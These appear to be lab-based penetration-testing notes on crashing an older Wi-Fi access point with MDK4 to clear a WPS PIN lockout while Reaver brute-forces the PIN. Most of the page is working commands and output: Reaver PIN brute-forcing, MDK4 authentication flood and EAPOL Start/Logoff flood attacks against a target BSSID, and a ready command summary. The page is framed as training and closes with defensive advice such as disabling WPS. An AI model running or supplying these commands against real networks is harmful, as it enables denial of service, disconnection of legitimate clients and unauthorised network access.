---
title: Crashing A Target AP
description: Crashing A Target AP
date: '2026-09-21'
tags: []
published: true
slug: crashing-a-target-ap
category: wifi
folder: misc-attacks-on-wps
order: 20
---
# Crashing a Target AP with MDK4

## What's the Problem?

While brute-forcing a WPS PIN, you'll likely run into a **lockout** at some point. There are actually **two different kinds** of locks:

1. **Temporary delay lock** — the router pauses for a set time after too many wrong guesses (covered in an earlier guide — fixable with timing flags)
2. **Reset-required lock** — the router stays locked until it's physically power-cycled or reset

This guide covers the second, tougher type — and how forcing a **crash/reset** on the router can sometimes clear the lock.

⚠️ **Important:** This only works on **older, vulnerable routers**. Modern routers are generally immune to this technique.

---

## Recap: Fixing the Temporary Delay Lock

If it's just a temporary delay, you can already handle this with Reaver's timing options:

```shellsession
iccys@htb[/htb]$ sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX -c 11
```

But if the router requires an actual **reset** to unlock, timing tricks won't help — you need to force a crash instead.

---

## The Setup: You'll Need 3 Terminals

### Terminal 1: Run the Brute-Force Attack

```shellsession
iccys@htb[/htb]$ sudo reaver -l 100 -r 3:45 -i wlan0mon -b 60:38:E0:XX:XX:XX -c 11
```

This keeps trying PINs in the background.

### Terminal 2: Watch the Lock Status

```shellsession
iccys@htb[/htb]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c 11 wlan0mon

CH 11 ][ Elapsed: 0 s ][ 2023-01-02 23:29 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 60:38:E0:XX:XX:XX  -52   0       14        0    0  11   65   WPA2 CCMP   PSK Locked  HTB-Wireless    
```

Notice the WPS column shows **"Locked"**. This means Terminal 1's brute-force attempts are now stuck — we need to force a reset.

---

## Terminal 3: Force a Crash with MDK4

MDK4 has a couple of attack modes designed for exactly this situation.

### Option A: Authentication Denial-of-Service

This floods the router with fake device connections, overwhelming its client list:

```shellsession
iccys@htb[/htb]$ sudo mdk4 wlan0mon a -a 60:38:E0:XX:XX:XX

Connecting Client BC:AC:DC:23:D1:31 to target AP 60:38:E0:XX:XX:XX
Packets sent:      1 - Speed:    1 packets/sec
Connecting Client 84:24:10:39:FD:D1 to target AP 60:38:E0:XX:XX:XX
Packets sent:   1618 - Speed: 1617 packets/sec
Connecting Client 8D:D3:44:A8:23:6B to target AP 60:38:E0:XX:XX:XX
```

This keeps spoofing new fake MAC addresses and "connecting" them to the router — flooding its resources until it potentially crashes and resets.

**Alternative: Intelligent Test mode**, which keeps the fake connections alive by replaying sniffed traffic:

```shellsession
iccys@htb[/htb]$ sudo mdk4 wlan0mon a -i 60:38:E0:XX:XX:XX
```

### Option B: EAPOL Start/Logoff Flooding

If Option A doesn't work, try flooding with EAPOL messages instead.

**EAPOL Start flood:**

```shellsession
iccys@htb[/htb]$ mdk4 wlan0mon e -t 60:38:E0:XX:XX:XX
```

**EAPOL Logoff flood** (kicks connected clients off):

```shellsession
iccys@htb[/htb]$ mdk4 wlan0mon e -t 60:38:E0:XX:XX:XX -l
```

💡 **Tip:** You can even run EAPOL Start in Terminal 3 and EAPOL Logoff in a 4th terminal simultaneously for a stronger effect. A regular deauthentication attack (from earlier guides) can also help kick clients off.

---

## Checking If It Worked

Go back to Terminal 2 and check the status again:

```shellsession
iccys@htb[/htb]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c 11 wlan0mon

CH 11 ][ Elapsed: 0 s ][ 2023-01-02 23:29 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 60:38:E0:XX:XX:XX  -52   0       14        0    0  11   65   WPA2 CCMP   PSK Label  HTB-Wireless    
```

🎉 The status changed from **"Locked"** to **"Label"** — meaning the router reset and the lock is gone! Your Reaver session in Terminal 1 should now be able to continue guessing PINs.

---

## Important Caveats

- ⚠️ This technique **only works on old, vulnerable routers**. Most modern routers won't crash from this.
- ⚠️ Sometimes the router crashes, but the **WPS lock stays active anyway** — so it's not guaranteed to help even when it works.
- ⚠️ This is a **loud, noisy technique**. It will almost certainly get detected during a real penetration test. Only use it as a last resort when stealth doesn't matter.
- 💡 The whole process (brute-force → check lock → crash if needed → repeat) can be automated with a script if you're doing this repeatedly.

---

## Wrapping Up: WPS Security Takeaways

Across this whole WPS series, the core lesson is simple: **WPS is old and risky.** Between weak 8-digit PINs, predictable vendor algorithms, Pixie Dust vulnerabilities, and even physical Push Button exploits, there are many ways WPS can be broken.

**Best practices for real-world network security:**

- Disable WPS entirely
- Use strong, unique WiFi passwords instead
- Keep router firmware updated
- Use modern encryption (WPA2/WPA3)

Staying informed about these attack techniques helps both penetration testers _and_ everyday network owners understand what's truly at risk.

---

## Command Summary

```bash
reaver -l 100 -r 3:45 -i wlan0mon -b <BSSID> -c 11              # Brute-force with lock-friendly timing (Terminal 1)
airodump-ng --wps --bssid <BSSID> -c 11 wlan0mon                # Watch WPS lock status (Terminal 2)
mdk4 wlan0mon a -a <BSSID>                                       # Authentication DoS flood (Terminal 3)
mdk4 wlan0mon a -i <BSSID>                                       # Authentication DoS, Intelligent Test mode
mdk4 wlan0mon e -t <BSSID>                                       # EAPOL Start message flood
mdk4 wlan0mon e -t <BSSID> -l                                    # EAPOL Logoff message flood (kicks clients)
```

**What each argument means:**

| Argument          | Meaning                                             |
| ----------------- | --------------------------------------------------- |
| `-l 100`          | Wait 100 seconds if the router locks (Reaver)       |
| `-r 3:45`         | Pause 45 seconds every 3 attempts (Reaver)          |
| `-i wlan0mon`     | Use the `wlan0mon` monitor-mode interface           |
| `-b <BSSID>`      | Target router's MAC address (Reaver)                |
| `-c 11`           | Target channel 11                                   |
| `--wps`           | Show WPS status info (airodump-ng)                  |
| `--bssid <BSSID>` | Only scan this specific access point (airodump-ng)  |
| `a` (mdk4 mode)   | Authentication Denial-of-Service attack mode        |
| `-a <BSSID>`      | Target AP for the Authentication DoS flood          |
| `-i <BSSID>`      | Use Intelligent Test mode against this AP           |
| `e` (mdk4 mode)   | EAPOL packet injection attack mode                  |
| `-t <BSSID>`      | Target AP for the EAPOL flood                       |
| `-l` (mdk4 flag)  | Use EAPOL Logoff messages instead of Start messages |



--- 


# You Can Find WPS Skills Assessment In Writeups on my site
